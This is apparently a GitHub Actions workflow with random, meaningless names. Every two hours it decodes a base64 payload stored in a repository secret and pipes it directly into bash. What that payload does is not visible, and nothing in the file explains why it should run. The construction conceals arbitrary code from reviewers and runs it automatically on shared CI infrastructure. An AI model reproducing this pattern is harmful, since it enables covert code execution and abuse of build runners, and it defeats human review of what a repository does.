name: ZlRHFncuoZIv
on:
  schedule:
    - cron: '0 */2 * * *'
  workflow_dispatch:
jobs:
  nWgLGgaZFnm:
    runs-on: ubuntu-latest
    env:
      AwGXmqdUJcC: ${{ secrets.xwzEREajsiz }}
    steps:
      - uses: actions/checkout@v5
      - run: echo "${{ secrets.vljvmlvz }}" | base64 -d | bash